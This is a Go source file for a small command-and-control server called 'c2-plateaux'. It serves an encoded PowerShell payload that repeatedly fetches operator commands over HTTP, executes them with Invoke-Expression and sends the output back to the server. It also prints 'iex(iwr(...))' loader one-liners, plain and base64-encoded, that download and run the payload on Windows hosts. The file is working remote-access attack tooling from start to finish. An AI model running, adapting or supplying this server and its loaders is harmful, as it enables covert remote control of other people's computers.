// Copyright (C) 2020-2022 Mattias Ohlsson
/*
 * This program is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <https://www.gnu.org/licenses/>.
 */

package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"unicode/utf16"
)

// stringToPowershellEnc, convert to base64 encoded UTF16LE
func stringToPowershellEnc(s string) string {

	u := utf16.Encode([]rune(s))

	b := make([]byte, len(u)*2)
	for i, r := range u {
		b[i*2] = byte(r)
		b[i*2+1] = byte(r >> 8)
	}

	return base64.StdEncoding.EncodeToString(b)
}

// handlerCmd, main c2 loop
func handlerCmd(w http.ResponseWriter, r *http.Request) {

	if r.Method == "GET" {

		reader := bufio.NewReader(os.Stdin)
		fmt.Print(r.RemoteAddr + "# ")
		cmd, _ := reader.ReadString('\n')

		w.Write([]byte(cmd))
	}
	if r.Method == "POST" {
		b, _ := ioutil.ReadAll(r.Body)
		fmt.Printf("%s", b)
	}
}

// handlerPsh, send psh payload to client
func handlerPsh(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Sending payload to", r.RemoteAddr)

	encPayload := "powershell -enc " + stringToPowershellEnc(`while($true) {Invoke-Expression(Invoke-WebRequest("`+baseURL+`/cmd")) 2>&1 | Out-String -outvariable out; Invoke-WebRequest -Uri "`+baseURL+`/cmd" -Method Post -Body $out}`)

	w.Write([]byte(encPayload))
}

var flagTCPPort *int
var flagIP *string

var bindAddress string
var baseURL string

func main() {

	fmt.Println("c2-plateaux - 0.2")

	flagTCPPort = flag.Int("p", 8080, "TCP port/LPORT")
	flagIP = flag.String("i", "127.0.0.1", "IP/LHOST")

	flag.Parse()

	if *flagTCPPort == 80 {
		baseURL = "http://" + *flagIP
	} else {
		baseURL = "http://" + *flagIP + ":" + strconv.Itoa(*flagTCPPort)
	}

	bindAddress = *flagIP + ":" + strconv.Itoa(*flagTCPPort)

	fmt.Println(`Windows loader (psh):`, `Invoke-Expression(Invoke-WebRequest("`+baseURL+`/psh"))`)
	fmt.Println(`Windows loader (psh alias):`, `iex(iwr("`+baseURL+`/psh"))`)

	fmt.Println(`Windows loader (psh-enc):`, stringToPowershellEnc(`Invoke-Expression(Invoke-WebRequest("`+baseURL+`/psh"))`))
	fmt.Println(`Windows loader (psh-enc alias):`, stringToPowershellEnc(`iex(iwr("`+baseURL+`/psh"))`))

	http.HandleFunc("/cmd", handlerCmd)
	http.HandleFunc("/psh", handlerPsh)

	fmt.Println("Listening on", bindAddress)
	http.ListenAndServe(bindAddress, nil)
}
